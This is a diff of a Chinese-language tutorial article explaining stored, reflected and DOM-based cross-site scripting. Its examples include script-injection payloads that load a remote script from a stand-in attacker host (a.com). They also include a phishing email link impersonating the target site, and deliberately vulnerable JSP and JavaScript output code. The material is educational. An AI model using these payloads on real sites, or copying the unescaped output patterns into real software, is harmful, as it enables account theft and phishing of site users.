@@ -14,13 +14,13 @@ Web程序将数据直接作为HTML显示（未进行HTML特殊字符转义、scr
 <li>恶意用户A发现某个博客系统B对博文的评论未做严格检查，而允许注入Javascript代码。</li>
 <li>恶意用户A找到一个知名度高的一篇访问量大的博文，发表以下评论代码：
 <source>
-<script src="http://c.com/xss.js"></script>
+<script src="http://a.com/xss.js"></script>
 楼主的帖子实在是写得太好了。文笔流畅,修辞得体,深得魏晋诸朝遗风,
 更将唐风宋骨发扬得入木三分,能在有生之年看见楼主的这个帖子。
 实在是我三生之幸啊。......
 </source>
 </li>
-<li>博客系统B在使用以下方式显示回帖（JSP语法）：
+<li>博客系统B使用以下方式显示回帖（JSP语法）：
 <source>
 回帖人：<%=comment.userId %>，回帖内容是：<%= comment.content %>
 </source>
@@ -29,12 +29,38 @@ Web程序将数据直接作为HTML显示（未进行HTML特殊字符转义、scr
 </ol>
 
 ===Reflected XSS Attacks===
-风险代码并没有被持久存储，而是在服务器端转了一圈之后就直接显示在生成的动态HTML中。这种攻击方式可以通过邮件等方式发送给用户
+风险代码并没有被持久存储，而是在服务器端转了一圈之后就直接显示在生成的动态HTML中。
+这种攻击方式常被以HTML邮件的方式发送给潜在受害者。
+
+攻击流程示例：
+<ol>
+<li>恶意用户A搜索、验证并确信某系统B在访问 <code>http://b.com/welcome.do?user=zhang3</code> 时，是以以下方式显示URL中的用户名的（JSP语法）：
+<source>
+ welcome <%=param["user"] %>!
+</source>
+</li>
+<li>恶意用户A就利用此漏洞，以系统B的名义向多个用户发送包含以下连接的HTML邮件，并诱导用户点击该链接：
+<source>
+{系统B}温馨提醒您：XXX 想加您好友，请点击
+<a href="http://b.com/welcome.do?user=zhang3<script src='http://a.com/xss.js'></script>">此处</a>
+进行处理！
+</source>
+</li>
+<li>后果：受害者在阅读该邮件并点击此链接后，在浏览系统B的欢迎画面时，就会加载并执行来自于 a.com 的恶意脚本</li>
+</ol>
+
 
 ===DOM Based XSS===
-与前两种的区别是：前两种最终会将风险代码写在生成HTML中，而这一种是服务器端返回的HTML本身并不包含风险代码，但是其中的JavaScript脚本在动态修改DOM时，未对输出值做充分的安全检查。
+这种方式与 Reflected XSS Attacks 比较相似，但区别在于：在Reflected XSS Attacks 中，有缺陷的系统返回的HTML中本身就已经包含了恶意代码；而在 DOM Based XSS 中，有缺陷的系统返回的HTML中本身并不包含恶意代码，而是通过JavaScript动态修改浏览器中的DOM树，但是JavaScript并没有对输入的内容做安全监察。
 
-：
+也即，在 Reflected XSS Attacks 的攻击流程示例的第二步中的代码替换为以下方式（HTML语法，而非JSP等服务器端脚本语法）：
+<source>
+ welcome <script>
+document.write(document.location.href.substring(document.location.href.indexOf("user=")+5));
+</script>!
+</source>
+
+与前两种的区别是：前两种最终会将风险代码写在生成HTML中，而这一种是服务器端返回的HTML本身并不包含风险代码，但是其中的JavaScript脚本在动态修改DOM时，未对输出值做充分的安全检查。
 
 
 注入点
